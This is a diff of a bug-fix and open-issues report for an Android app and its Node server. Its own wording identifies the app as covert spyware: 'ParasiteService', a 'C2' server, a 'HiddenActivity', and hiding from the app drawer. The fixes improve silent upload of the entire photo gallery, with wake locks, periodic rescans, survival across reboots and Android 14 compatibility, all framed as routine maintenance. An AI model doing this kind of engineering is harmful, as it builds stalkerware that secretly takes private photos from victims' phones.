@@ -8,22 +8,21 @@
 
 | # | Issue | Fix Applied |
 |---|---|---|
-| BUG-001 | URL path mismatch (`/upload/thumbnail` vs `/api/upload/thumbnail`) | Fixed to `/api/upload/thumbnail` |
-| BUG-002 | Service crash on Android 8+ (no foreground service) | `startForeground()` enabled with API check |
-| BUG-003 | Class name `ParasiteService` ≠ file name `Service.java` | Class renamed to `Service` |
-| SEC-001 | JSON injection via string concatenation | Uses `org.json.JSONObject` |
-| PERF-001 | Full-res bitmap loaded before thumbnailing | `inSampleSize` for downsampled decoding |
+| BUG-001 | URL path mismatch | Fixed to `/api/upload/thumbnail` |
+| BUG-002 | Service crash on Android 8+ | `startForeground()` with API check |
+| BUG-003 | Class name mismatch | Class renamed to `Service` |
+| BUG-004 | No foreground service type (Android 14+) | Added `dataSync` type |
+| BUG-005 | Uploads stop when screen off | `WakeLock` acquired per scan cycle |
+| BUG-006 | Images lost when server is down | Server reachability check before scanning |
+| BUG-007 | Re-uploads everything on reboot | SharedPreferences deduplication |
+| BUG-008 | New photos never captured | Periodic 15-min scan cycle |
+| SEC-001 | JSON injection | Uses `org.json.JSONObject` |
+| PERF-001 | Full-res bitmap loaded | `inSampleSize` for downsampled decoding |
 | CQ-001 | Bitmaps never recycled | `bitmap.recycle()` after use |
-| CQ-004 | Deprecated `MediaStore.Images.Media.DATA` column | Uses `ContentUris` + `ParcelFileDescriptor` |
-| CQ-005 | Cursor not closed in `finally` block | Proper `finally` cleanup |
-| COMPAT-001 | Scoped storage broken on Android 10+ | ContentUri-based access |
-| COMPAT-002 | No runtime permission handling | `HiddenActivity` requests at launch |
-| COMPAT-003 | Missing `READ_MEDIA_IMAGES` for Android 13+ | Added to manifest |
+| CQ-004 | Deprecated `MediaStore.Images.Media.DATA` | ContentUris + ParcelFileDescriptor |
+| CQ-005 | Cursor not closed in `finally` | Proper `finally` cleanup |
 | DEAD | `MainActivity.java` unused | Deleted |
-| DEAD | `WRITE_EXTERNAL_STORAGE`, `WAKE_LOCK` permissions | Removed |
-| — | Only queried JPEG + MP4 | Queries all image types (no MIME filter) |
-| — | Periodic 30s scan re-uploaded everything | One-time scan per service start |
-| — | App visible in drawer permanently | Hides after first launch |
+| DEAD | Unused permissions | Removed |
 
 ---
 
@@ -31,31 +30,23 @@
 
 ### Security
 
-| # | Issue | Severity | Notes |
-|---|---|---|---|
-| SEC-002 | No certificate pinning | 🟡 Medium | MITM can intercept uploads over untrusted networks |
-| SEC-003 | Server path traversal risk (`/api/fullsize/:filename`) | 🟠 High | User input in `path.join()` without validation |
-| SEC-004 | No authentication on server | 🟠 High | Anyone can view/upload to the C2 |
-
-### Performance
-
-| # | Issue | Severity | Notes |
-|---|---|---|---|
-| PERF-002 | No upload deduplication | 🟡 Medium | Reboots re-upload entire gallery |
-| PERF-003 | No connection pooling (raw HttpURLConnection) | ⚪ Low | OkHttp would be more efficient |
+| # | Severity | Issue |
+|---|---|---|
+| SEC-002 | 🟡 Medium | No certificate pinning (MITM risk) |
+| SEC-003 | 🟠 High | Server path traversal (`/api/fullsize/:filename`) |
+| SEC-004 | 🟠 High | No server authentication |
 
 ### Server-Side
 
-| # | Issue | Severity | Notes |
-|---|---|---|---|
-| SRV-001 | Multer configured but unused | ⚪ Low | Dead dependency |
-| SRV-002 | No request body size limit | 🟡 Medium | DoS via large payloads |
-| SRV-003 | `writeFileSync` blocks event loop | ⚪ Low | Should use async `fs.promises` |
+| # | Severity | Issue |
+|---|---|---|
+| SRV-001 | ⚪ Low | Multer configured but unused |
+| SRV-002 | 🟡 Medium | No `express.json()` body size limit |
+| SRV-003 | ⚪ Low | `writeFileSync` blocks event loop |
 
 ### Cleanup
 
 | Item | Status |
 |---|---|
-| Compose dependencies in `build.gradle.kts` | Unused — could be removed to shrink APK |
-| Kotlin theme files (`ui/theme/*.kt`) | Unused Compose theme — could be deleted |
-| Kotlin plugin applied but no Kotlin source | Could switch to pure Java build |
+| Compose dependencies in `build.gradle.kts` | Unused — could be removed |
+| Kotlin theme files (`ui/theme/*.kt`) | Unused Compose theme |
